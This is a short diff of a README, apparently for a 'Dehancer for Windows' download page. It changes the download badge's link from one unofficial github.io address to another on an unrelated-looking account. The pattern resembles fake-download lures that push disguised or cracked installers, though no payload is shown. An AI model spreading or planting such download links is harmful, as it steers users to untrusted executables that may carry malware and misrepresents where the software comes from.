@@ -4,7 +4,7 @@
 
 ## 📥 Download Dehancer for Windows
 
-[![⬇️ Download Dehancer](https://img.shields.io/badge/Download-Dehancer-blue?style=for-the-badge&logo=windows)](https://dehancerload.github.io/.github/)
+[![⬇️ Download Dehancer](https://img.shields.io/badge/Download-Dehancer-blue?style=for-the-badge&logo=windows)](https://constantini911apryl.github.io/.github/dehancer-kit)
 
 ---
 
